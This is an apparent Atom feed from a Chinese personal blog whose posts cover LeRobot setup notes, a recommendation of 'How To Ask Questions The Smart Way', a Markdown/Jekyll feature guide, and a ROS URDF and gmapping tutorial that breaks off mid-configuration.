<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://gewenhao.win/feed.xml" rel="self" type="application/atom+xml"/><link href="https://gewenhao.win/" rel="alternate" type="text/html" hreflang="zh"/><updated>2025-12-22T13:28:44+00:00</updated><id>https://gewenhao.win/feed.xml</id><title type="html">Robben’s personal website</title><subtitle>This is Robben Ge&apos;s personal website. Here you can find information about my research, publications, projects, and more. Feel free to explore and get in touch! </subtitle><entry><title type="html">lerobot探索</title><link href="https://gewenhao.win/blog/2025/lerobot%E6%8E%A2%E7%B4%A2/" rel="alternate" type="text/html" title="lerobot探索"/><published>2025-12-16T22:30:00+00:00</published><updated>2025-12-16T22:30:00+00:00</updated><id>https://gewenhao.win/blog/2025/lerobot%E6%8E%A2%E7%B4%A2</id><content type="html" xml:base="https://gewenhao.win/blog/2025/lerobot%E6%8E%A2%E7%B4%A2/"><![CDATA[<h1 id="资源整理">资源整理</h1> <h2 id="文档资料">文档资料</h2> <p>官网：https://huggingface.co/lerobot 官方介绍文档：https://huggingface.co/docs/lerobot/en/index 官方github仓库：https://github.com/huggingface/lerobot</p> <h1 id="步骤记录">步骤记录</h1> <h2 id="installation">installation</h2> <p>1.安装miniforge 2.create虚拟环境3.安装ffmpeg 4.克隆项目，pip install -e .</p> <h2 id="simulations">simulations</h2> <p>pip install -e “.[aloha]”</p>]]></content><author><name></name></author><category term="技术"/><category term="lerobot"/><category term="复现"/><summary type="html"><![CDATA[记录lerobot项目的熟悉与复现尝试]]></summary></entry><entry><title type="html">提问的智慧</title><link href="https://gewenhao.win/blog/2025/%E6%8F%90%E9%97%AE%E7%9A%84%E6%99%BA%E6%85%A7/" rel="alternate" type="text/html" title="提问的智慧"/><published>2025-01-20T10:00:00+00:00</published><updated>2025-01-20T10:00:00+00:00</updated><id>https://gewenhao.win/blog/2025/%E6%8F%90%E9%97%AE%E7%9A%84%E6%99%BA%E6%85%A7</id><content type="html" xml:base="https://gewenhao.win/blog/2025/%E6%8F%90%E9%97%AE%E7%9A%84%E6%99%BA%E6%85%A7/"><![CDATA[<h1 id="提问的智慧">提问的智慧</h1> <blockquote> <p><strong>重要提示</strong>：本文是对经典文章《提问的智慧》（How To Ask Questions The Smart Way）的引用和推荐。原文作者为 Eric S. Raymond，本文仅提供原文链接和简要介绍，不包含完整内容。</p> </blockquote> <h2 id="关于这篇文章">关于这篇文章</h2> <p>《提问的智慧》（英文：How To Ask Questions The Smart Way）是一篇非常经典的技术文档，由 Eric S. Raymond 和 Rick Moen 撰写。这篇文章教导人们如何有效地提问，以便在技术社区、论坛或任何需要帮助的场合获得更好的回应。</p> <h2 id="为什么推荐这篇文章">为什么推荐这篇文章？</h2> <p>无论是：</p> <ul> <li>在技术社区寻求帮助</li> <li>在 GitHub 上提交 Issue</li> <li>在 Stack Overflow 提问</li> <li>向同事或导师请教问题</li> <li>参与开源项目讨论</li> </ul> <p>掌握正确的提问方式都能帮助你：</p> <ul> <li>✅ 更快获得有用的回答</li> <li>✅ 建立良好的沟通习惯</li> <li>✅ 展现专业和尊重</li> <li>✅ 提高问题解决的效率</li> </ul> <h2 id="核心要点简要">核心要点（简要）</h2> <ol> <li><strong>在提问前先尝试自己解决</strong>：搜索、阅读文档、尝试调试</li> <li><strong>提供完整的信息</strong>：环境、错误信息、复现步骤</li> <li><strong>使用清晰、准确的标题</strong>：让回答者快速理解问题</li> <li><strong>尊重他人时间</strong>：问题要精炼，避免冗长</li> <li><strong>表达感谢</strong>：对帮助者表示感谢</li> </ol> <h2 id="阅读原文">阅读原文</h2> <h3 id="中文版本">中文版本</h3> <ul> <li><a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way/blob/main/README-zh_CN.md">提问的智慧 - 中文版（GitHub）</a></li> <li><a href="https://github.com/ryanhanwu/How-To-Ask-Questions-The-Smart-Way">提问的智慧 - 中文版（在线阅读）</a></li> </ul> <h3 id="英文原版">英文原版</h3> <ul> <li><a href="http://www.catb.org/~esr/faqs/smart-questions.html">How To Ask Questions The Smart Way - 官方原文</a></li> <li><a href="http://www.catb.org/~esr/">Eric S. Raymond 的个人网站</a></li> </ul> <h2 id="相关资源">相关资源</h2> <ul> <li><a href="https://github.com/isaacs/github/issues/1">GitHub 官方指南：如何提交 Issue</a></li> <li><a href="https://stackoverflow.com/help/how-to-ask">Stack Overflow 提问指南</a></li> </ul> <hr/> <p><strong>版权声明</strong>：本文引用自 Eric S. Raymond 和 Rick Moen 的原创作品《How To Ask Questions The Smart Way》。原文遵循特定的版权许可，请访问原文链接查看详细的版权信息。</p> <p><strong>建议</strong>：强烈建议阅读完整原文，本文仅作为引荐和索引。</p>]]></content><author><name></name></author><category term="学习"/><category term="学习"/><category term="沟通"/><category term="技巧"/><summary type="html"><![CDATA[引用经典文章《提问的智慧》，帮助大家学会如何有效地提问以获得更好的帮助]]></summary></entry><entry><title type="html">Markdown 功能使用指南</title><link href="https://gewenhao.win/blog/2025/markdown-features-guide/" rel="alternate" type="text/html" title="Markdown 功能使用指南"/><published>2025-01-15T14:00:00+00:00</published><updated>2025-01-15T14:00:00+00:00</updated><id>https://gewenhao.win/blog/2025/markdown-features-guide</id><content type="html" xml:base="https://gewenhao.win/blog/2025/markdown-features-guide/"><![CDATA[<p>这是一篇综合指南，展示了在博客文章中可以使用的所有功能。你可以参考这篇文章来了解如何使用各种 Markdown 和 Jekyll 特性。</p> <h2 id="1-基础格式和链接">1. 基础格式和链接</h2> <h3 id="文本格式">文本格式</h3> <p>你可以使用 <strong>粗体</strong>、<em>斜体</em>、<del>删除线</del> 等格式。</p> <h3 id="链接">链接</h3> <p>这是一个 <a href="https://example.com">链接示例</a>。</p> <h3 id="列表">列表</h3> <p><strong>无序列表：</strong></p> <ul> <li>项目 1</li> <li>项目 2</li> <li>项目 3</li> </ul> <p><strong>有序列表：</strong></p> <ol> <li>第一项</li> <li>第二项</li> <li>第三项</li> </ol> <p><strong>任务列表：</strong></p> <ul class="task-list"> <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked"/>已完成的任务</li> <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled"/>未完成的任务 <ul class="task-list"> <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled" checked="checked"/>子任务 1</li> <li class="task-list-item"><input type="checkbox" class="task-list-item-checkbox" disabled="disabled"/>子任务 2</li> </ul> </li> </ul> <h3 id="引用">引用</h3> <blockquote> <p>这是一个普通的引用块 可以包含多行内容</p> </blockquote> <hr/> <h2 id="2-自定义引用块">2. 自定义引用块</h2> <p>你可以使用三种特殊样式的引用块：</p> <blockquote> <h5 id="tip">TIP</h5> <p class="block-tip">这是一个提示信息，用于给出建议或提示。</p> </blockquote> <blockquote> <h5 id="warning">WARNING</h5> <p class="block-warning">这是一个警告信息，用于提醒用户注意某些事项。</p> </blockquote> <blockquote> <h5 id="danger">DANGER</h5> <p class="block-danger">这是一个危险提示，用于强调重要的警告信息。</p> </blockquote> <hr/> <h2 id="3-代码高亮">3. 代码高亮</h2> <h3 id="基础代码块">基础代码块</h3> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">hello_world</span><span class="p">():</span>
    <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Hello, World!</span><span class="sh">"</span><span class="p">)</span>
    <span class="k">return</span> <span class="bp">True</span>
</code></pre></div></div> <h3 id="带行号的代码块">带行号的代码块</h3> <p>使用 Liquid 标签可以显示行号：</p> <figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="code"><pre><span class="k">def</span> <span class="nf">fibonacci</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
<span class="k">if</span> <span class="n">n</span> <span class="o">&lt;=</span> <span class="mi">1</span><span class="p">:</span>
<span class="k">return</span> <span class="n">n</span>
<span class="k">return</span> <span class="nf">fibonacci</span><span class="p">(</span><span class="n">n</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="nf">fibonacci</span><span class="p">(</span><span class="n">n</span><span class="o">-</span><span class="mi">2</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></pre></figure> <h3 id="代码差异显示">代码差异显示</h3> <p>使用 <code class="language-plaintext highlighter-rouge">diff</code> 语言显示代码差异：</p> <div class="language-diff highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gd">- console.log("Hello World!")
</span><span class="gi">+ console.log("Hello from Diff2Html!")
</span></code></pre></div></div> <p>使用 <code class="language-plaintext highlighter-rouge">diff2html</code> 可以显示更美观的差异：</p> <pre><code class="language-diff2html">diff --git a/sample.js b/sample.js
index 0000001..0ddf2ba
--- a/sample.js
+++ b/sample.js
@@ -1 +1 @@
-console.log("Hello World!")
+console.log("Hello from Diff2Html!")
</code></pre> <hr/> <h2 id="4-数学公式">4. 数学公式</h2> <p>这个主题支持使用 MathJax 3 渲染数学公式。</p> <h3 id="行内公式">行内公式</h3> <p>行内公式：\(E = mc^2\)</p> <h3 id="块级公式">块级公式</h3> \[\sum_{k=1}^\infty |\langle x, e_k \rangle|^2 \leq \|x\|^2\] <h3 id="带编号的公式">带编号的公式</h3> <p>\begin{equation} \label{eq:cauchy-schwarz} \left( \sum<em>{k=1}^n a_k b_k \right)^2 \leq \left( \sum</em>{k=1}^n a<em>k^2 \right) \left( \sum</em>{k=1}^n b_k^2 \right) \end{equation}</p> <p>引用公式：\eqref{eq:cauchy-schwarz}</p> <hr/> <h2 id="5-图片展示">5. 图片展示</h2> <h3 id="单张图片">单张图片</h3> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/9-480.webp 480w,/assets/img/9-800.webp 800w,/assets/img/9-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/9.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> 单张图片示例 </div> <h3 id="多张图片网格">多张图片网格</h3> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/9-480.webp 480w,/assets/img/9-800.webp 800w,/assets/img/9-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/9.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/7-480.webp 480w,/assets/img/7-800.webp 800w,/assets/img/7-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/7.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> 两张图片并排显示，支持缩放功能 </div> <h3 id="三张图片网格">三张图片网格</h3> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/11-480.webp 480w,/assets/img/11-800.webp 800w,/assets/img/11-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/11.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/12-480.webp 480w,/assets/img/12-800.webp 800w,/assets/img/12-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/12.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/7-480.webp 480w,/assets/img/7-800.webp 800w,/assets/img/7-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/7.jpg" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> </div> <div class="caption"> 三张图片网格布局 </div> <hr/> <h2 id="6-视频嵌入">6. 视频嵌入</h2> <h3 id="本地视频">本地视频</h3> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <video src="/assets/video/pexels-engin-akyurt-6069112-960x540-30fps.mp4" class="img-fluid rounded z-depth-1" width="auto" height="auto" controls=""/> </figure> </div> </div> <div class="caption"> 本地视频文件示例 </div> <h3 id="youtube-视频">YouTube 视频</h3> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <iframe src="https://www.youtube.com/embed/jNQXAC9IVRw" class="img-fluid rounded z-depth-1" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen="" width="auto" height="auto"/> </figure> </div> </div> <div class="caption"> YouTube 视频嵌入示例 </div> <hr/> <h2 id="7-音频嵌入">7. 音频嵌入</h2> <div class="row mt-3"> <div class="col-sm mt-3 mt-md-0"> <figure> <audio src="/assets/audio/epicaly-short-113909.mp3" controls=""/> </figure> </div> </div> <div class="caption"> 音频播放器示例 </div> <hr/> <h2 id="8-表格">8. 表格</h2> <h3 id="markdown-表格">Markdown 表格</h3> <p>在 front matter 中添加 <code class="language-plaintext highlighter-rouge">pretty_table: true</code> 可以美化表格：</p> <table> <thead> <tr> <th style="text-align: left">左对齐</th> <th style="text-align: center">居中</th> <th style="text-align: right">右对齐</th> </tr> </thead> <tbody> <tr> <td style="text-align: left">内容 1</td> <td style="text-align: center">内容 2</td> <td style="text-align: right">内容 3</td> </tr> <tr> <td style="text-align: left">内容 4</td> <td style="text-align: center">内容 5</td> <td style="text-align: right">内容 6</td> </tr> </tbody> </table> <hr/> <h2 id="9-图表">9. 图表</h2> <h3 id="chartjs-图表">Chart.js 图表</h3> <p>在 front matter 中添加 <code class="language-plaintext highlighter-rouge">chart: { chartjs: true }</code> 可以启用 Chart.js 支持。</p> <p><strong>折线图示例：</strong></p> <pre><code class="language-chartjs">{
  "type": "line",
  "data": {
    "labels": ["一月", "二月", "三月", "四月", "五月", "六月", "七月"],
    "datasets": [{
      "label": "数据量",
      "fill": false,
      "lineTension": 0.1,
      "backgroundColor": "rgba(75,192,192,0.4)",
      "borderColor": "rgba(75,192,192,1)",
      "data": [65, 59, 80, 81, 56, 55, 40]
    }]
  },
  "options": {}
}
</code></pre> <p><strong>饼图示例：</strong></p> <pre><code class="language-chartjs">{
  "type": "doughnut",
  "data": {
    "labels": ["红色", "蓝色", "黄色"],
    "datasets": [{
      "data": [300, 50, 100],
      "backgroundColor": ["#FF6384", "#36A2EB", "#FFCE56"]
    }]
  },
  "options": {}
}
</code></pre> <hr/> <h2 id="10-其他功能">10. 其他功能</h2> <blockquote> <p><strong>注意</strong>：Twitter 嵌入和 Jupyter Notebook 功能已从本网站移除。如需使用这些功能，请参考相关插件的文档。</p> </blockquote> <hr/> <h2 id="front-matter-配置说明">Front Matter 配置说明</h2> <p>以下是常用的 front matter 字段：</p> <div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nn">---</span>
<span class="na">layout</span><span class="pi">:</span> <span class="s">post</span> <span class="c1"># 必须：使用 post 布局</span>
<span class="na">title</span><span class="pi">:</span> <span class="s">文章标题</span> <span class="c1"># 必须：文章标题</span>
<span class="na">date</span><span class="pi">:</span> <span class="s">2025-01-15 14:00:00</span> <span class="c1"># 必须：发布日期</span>
<span class="na">description</span><span class="pi">:</span> <span class="s">文章描述</span> <span class="c1"># 可选：文章描述</span>
<span class="na">tags</span><span class="pi">:</span> <span class="s">标签1 标签2</span> <span class="c1"># 可选：标签（空格分隔）</span>
<span class="na">categories</span><span class="pi">:</span> <span class="s">分类1</span> <span class="c1"># 可选：分类</span>
<span class="na">thumbnail</span><span class="pi">:</span> <span class="s">assets/img/9.jpg</span> <span class="c1"># 可选：缩略图</span>
<span class="na">featured</span><span class="pi">:</span> <span class="kc">true</span> <span class="c1"># 可选：标记为精选文章</span>
<span class="na">giscus_comments</span><span class="pi">:</span> <span class="kc">true</span> <span class="c1"># 可选：启用 Giscus 评论</span>
<span class="na">related_posts</span><span class="pi">:</span> <span class="kc">true</span> <span class="c1"># 可选：显示相关文章</span>
<span class="na">toc</span><span class="pi">:</span> <span class="c1"># 可选：目录配置</span>
  <span class="na">beginning</span><span class="pi">:</span> <span class="kc">true</span> <span class="c1"># 在文章开头显示目录</span>
<span class="na">chart</span><span class="pi">:</span> <span class="c1"># 可选：图表配置</span>
  <span class="na">chartjs</span><span class="pi">:</span> <span class="kc">true</span> <span class="c1"># 启用 Chart.js</span>
<span class="na">pretty_table</span><span class="pi">:</span> <span class="kc">true</span> <span class="c1"># 可选：美化表格</span>
<span class="na">code_diff</span><span class="pi">:</span> <span class="kc">true</span> <span class="c1"># 可选：启用代码差异显示</span>
<span class="nn">---</span>
</code></pre></div></div> <hr/> <h2 id="使用提示">使用提示</h2> <ol> <li><strong>图片路径</strong>：图片应放在 <code class="language-plaintext highlighter-rouge">assets/img/</code> 目录下</li> <li><strong>视频路径</strong>：视频应放在 <code class="language-plaintext highlighter-rouge">assets/video/</code> 目录下</li> <li><strong>音频路径</strong>：音频应放在 <code class="language-plaintext highlighter-rouge">assets/audio/</code> 目录下</li> <li><strong>网格布局</strong>：使用 Bootstrap 的 <code class="language-plaintext highlighter-rouge">row</code> 和 <code class="language-plaintext highlighter-rouge">col-sm</code> 类来创建响应式布局</li> <li><strong>图片缩放</strong>：添加 <code class="language-plaintext highlighter-rouge">zoomable=true</code> 参数使图片可缩放</li> <li><strong>代码高亮</strong>：支持 100+ 种编程语言的语法高亮</li> <li><strong>数学公式</strong>：使用 <code class="language-plaintext highlighter-rouge">$$</code> 包裹公式，支持 LaTeX 语法</li> </ol> <hr/> <h2 id="更多资源">更多资源</h2> <ul> <li><a href="https://jekyllrb.com/docs/">Jekyll 官方文档</a></li> <li><a href="https://www.markdownguide.org/">Markdown 语法指南</a></li> <li><a href="https://www.mathjax.org/">MathJax 文档</a></li> <li><a href="https://www.chartjs.org/">Chart.js 文档</a></li> </ul> <hr/> <p>希望这篇指南对你有帮助！如有问题，欢迎在评论区留言。</p>]]></content><author><name></name></author><category term="教程"/><category term="指南"/><category term="教程"/><category term="markdown"/><summary type="html"><![CDATA[这是一篇综合指南，展示了博客文章中可以使用的所有 Markdown 和 Jekyll 功能]]></summary></entry><entry><title type="html">ROS 机器人开发实践</title><link href="https://gewenhao.win/blog/2023/ROS%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/" rel="alternate" type="text/html" title="ROS 机器人开发实践"/><published>2023-10-01T10:00:00+00:00</published><updated>2023-10-01T10:00:00+00:00</updated><id>https://gewenhao.win/blog/2023/ROS%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5</id><content type="html" xml:base="https://gewenhao.win/blog/2023/ROS%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%BC%80%E5%8F%91%E5%AE%9E%E8%B7%B5/"><![CDATA[<h1 id="ros-机器人开发实践">ROS 机器人开发实践</h1> <h2 id="一urdf-机器人建模">一、URDF 机器人建模</h2> <h3 id="urdf-概述">URDF 概述</h3> <p>URDF（Unified Robot Description Format）是 ROS 中用于描述机器人模型的 XML 格式文件。URDF 不能单独使用，需要结合 Rviz 或 Gazebo，URDF 只是一个文件，需要在 Rviz 或 Gazebo 中渲染成图形化的机器人模型。</p> <h3 id="urdf-语法详解">URDF 语法详解</h3> <h4 id="1-robot-标签">1. robot 标签</h4> <p>urdf 中为了保证 xml 语法的完整性，使用了 <code class="language-plaintext highlighter-rouge">robot</code> 标签作为根标签，所有的 link 和 joint 以及其他标签都必须包含在 robot 标签内，在该标签内可以通过 name 属性设置机器人模型的名称。</p> <p><strong>属性：</strong></p> <ul> <li>name: 指定机器人模型的名称</li> </ul> <h4 id="2-link-标签">2. link 标签</h4> <p>link 标签用于描述机器人的一个刚体部分，比如机器人的底座、轮子等。</p> <p><strong>属性：</strong></p> <ul> <li>name: 指定连杆的名称</li> </ul> <p><strong>子标签：</strong></p> <ul> <li><strong>visual</strong> - 描述外观(对应的数据是可视的) <ul> <li>geometry 设置连杆的形状 <ul> <li>box(盒状): 属性 size=长(x) 宽(y) 高(z)</li> <li>cylinder(圆柱): 属性 radius=半径 length=高度</li> <li>sphere(球体): 属性 radius=半径</li> <li>mesh(为连杆添加皮肤): 属性 filename=资源路径(格式: <code class="language-plaintext highlighter-rouge">package://&lt;packagename&gt;/&lt;path&gt;/文件</code>)</li> </ul> </li> <li>origin 设置偏移量与倾斜弧度 <ul> <li>属性1: xyz=x偏移 y偏移 z偏移</li> <li>属性2: rpy=x翻滚 y俯仰 z偏航 (单位是弧度)</li> </ul> </li> <li>material 设置材料属性(颜色) <ul> <li>属性: name</li> <li>标签: color <ul> <li>属性: rgba=红绿蓝权重值与透明度 (每个权重值以及透明度取值[0,1])</li> </ul> </li> </ul> </li> </ul> </li> <li><strong>collision</strong> - 连杆的碰撞属性</li> <li><strong>Inertial</strong> - 连杆的惯性矩阵</li> </ul> <h4 id="3-joint-标签">3. joint 标签</h4> <p>joint 标签用于描述两个 link 之间的连接关系。</p> <h3 id="urdf-集成-rviz-基本流程">URDF 集成 Rviz 基本流程</h3> <p><strong>需求描述：</strong> 在 Rviz 中显示一个盒状机器人</p> <p><strong>实现流程：</strong></p> <ol> <li><strong>准备：</strong> 新建功能包，导入依赖</li> <li><strong>核心：</strong> 编写 urdf 文件</li> <li><strong>核心：</strong> 在 launch 文件集成 URDF 与 Rviz</li> <li><strong>在 Rviz 中显示机器人模型</strong></li> </ol> <h4 id="1-创建功能包导入依赖">1. 创建功能包，导入依赖</h4> <p>创建一个新的功能包，名称自定义，导入依赖包：<code class="language-plaintext highlighter-rouge">urdf</code> 与 <code class="language-plaintext highlighter-rouge">xacro</code></p> <p>在当前功能包下，再新建几个目录：</p> <ul> <li><code class="language-plaintext highlighter-rouge">urdf</code>: 存储 urdf 文件的目录</li> <li><code class="language-plaintext highlighter-rouge">meshes</code>: 机器人模型渲染文件(暂不使用)</li> <li><code class="language-plaintext highlighter-rouge">config</code>: 配置文件</li> <li><code class="language-plaintext highlighter-rouge">launch</code>: 存储 launch 启动文件</li> </ul> <h4 id="2-编写-urdf-文件">2. 编写 URDF 文件</h4> <p>新建一个子级文件夹：<code class="language-plaintext highlighter-rouge">urdf</code>(可选)，文件夹中添加一个 <code class="language-plaintext highlighter-rouge">.urdf</code> 文件：</p> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;robot</span> <span class="na">name=</span><span class="s">"mycar"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">name=</span><span class="s">"base_link"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;visual&gt;</span>
            <span class="nt">&lt;geometry&gt;</span>
                <span class="nt">&lt;box</span> <span class="na">size=</span><span class="s">"0.5 0.2 0.1"</span> <span class="nt">/&gt;</span>
            <span class="nt">&lt;/geometry&gt;</span>
        <span class="nt">&lt;/visual&gt;</span>
    <span class="nt">&lt;/link&gt;</span>
<span class="nt">&lt;/robot&gt;</span>
</code></pre></div></div> <h4 id="3-在-launch-文件中集成-urdf-与-rviz">3. 在 launch 文件中集成 URDF 与 Rviz</h4> <p>在 <code class="language-plaintext highlighter-rouge">launch</code> 目录下，新建一个 launch 文件：</p> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;launch&gt;</span>
    <span class="c">&lt;!-- 设置参数 --&gt;</span>
    <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"robot_description"</span> <span class="na">textfile=</span><span class="s">"$(find 包名)/urdf/urdf/urdf01_HelloWorld.urdf"</span> <span class="nt">/&gt;</span>

    <span class="c">&lt;!-- 启动 rviz --&gt;</span>
    <span class="nt">&lt;node</span> <span class="na">pkg=</span><span class="s">"rviz"</span> <span class="na">type=</span><span class="s">"rviz"</span> <span class="na">name=</span><span class="s">"rviz"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/launch&gt;</span>
</code></pre></div></div> <h4 id="4-在-rviz-中显示机器人模型">4. 在 Rviz 中显示机器人模型</h4> <p>rviz 启动后，需要手动添加机器人显示组件：</p> <ol> <li>点击左下角的 Add 按钮</li> <li>选择 RobotModel 组件</li> <li>设置 Fixed Frame 为 base_link</li> </ol> <h4 id="5-优化-rviz-启动">5. 优化 rviz 启动</h4> <p>重复启动 <code class="language-plaintext highlighter-rouge">launch</code> 文件时，Rviz 之前的组件配置信息不会自动保存，可以保存配置文件：</p> <ol> <li>将当前配置保存进 <code class="language-plaintext highlighter-rouge">config</code> 目录</li> <li><code class="language-plaintext highlighter-rouge">launch</code> 文件中 Rviz 的启动配置添加参数：<code class="language-plaintext highlighter-rouge">args</code>，值设置为 <code class="language-plaintext highlighter-rouge">-d 配置文件路径</code></li> </ol> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;launch&gt;</span>
    <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"robot_description"</span> <span class="na">textfile=</span><span class="s">"$(find 包名)/urdf/urdf/urdf01_HelloWorld.urdf"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;node</span> <span class="na">pkg=</span><span class="s">"rviz"</span> <span class="na">type=</span><span class="s">"rviz"</span> <span class="na">name=</span><span class="s">"rviz"</span> <span class="na">args=</span><span class="s">"-d $(find 包名)/config/rviz/show_mycar.rviz"</span> <span class="nt">/&gt;</span>
<span class="nt">&lt;/launch&gt;</span>
</code></pre></div></div> <hr/> <h2 id="二slam-建图导航">二、SLAM 建图导航</h2> <h3 id="slam-建图">SLAM 建图</h3> <p>SLAM（Simultaneous Localization and Mapping）即同时定位与建图，指机器人在未知环境中，通过传感器数据构建环境地图，同时确定自身在地图中的位置。</p> <h4 id="gmapping-使用">gmapping 使用</h4> <p>gmapping 是 ROS 中常用的 SLAM 算法包，使用粒子滤波算法进行建图。</p> <p><strong>Launch 文件配置示例：</strong></p> <div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;launch&gt;</span>
    <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"use_sim_time"</span> <span class="na">value=</span><span class="s">"true"</span><span class="nt">/&gt;</span>
    <span class="nt">&lt;node</span> <span class="na">pkg=</span><span class="s">"gmapping"</span> <span class="na">type=</span><span class="s">"slam_gmapping"</span> <span class="na">name=</span><span class="s">"slam_gmapping"</span> <span class="na">output=</span><span class="s">"screen"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;remap</span> <span class="na">from=</span><span class="s">"scan"</span> <span class="na">to=</span><span class="s">"scan"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"base_frame"</span> <span class="na">value=</span><span class="s">"base_footprint"</span><span class="nt">/&gt;</span><span class="c">&lt;!--底盘坐标系--&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"odom_frame"</span> <span class="na">value=</span><span class="s">"odom"</span><span class="nt">/&gt;</span> <span class="c">&lt;!--里程计坐标系--&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"map_update_interval"</span> <span class="na">value=</span><span class="s">"5.0"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"maxUrange"</span> <span class="na">value=</span><span class="s">"16.0"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"sigma"</span> <span class="na">value=</span><span class="s">"0.05"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"kernelSize"</span> <span class="na">value=</span><span class="s">"1"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"lstep"</span> <span class="na">value=</span><span class="s">"0.05"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"astep"</span> <span class="na">value=</span><span class="s">"0.05"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"iterations"</span> <span class="na">value=</span><span class="s">"5"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"lsigma"</span> <span class="na">value=</span><span class="s">"0.075"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"ogain"</span> <span class="na">value=</span><span class="s">"3.0"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"lskip"</span> <span class="na">value=</span><span class="s">"0"</span><span class="nt">/&gt;</span>
        <span class="nt">&lt;param</span> <span class="na">name=</span><span class="s">"srr"</span> <span class="na">value=</span><span class="s">"0.1"</span><span class="nt">/&gt;</span>
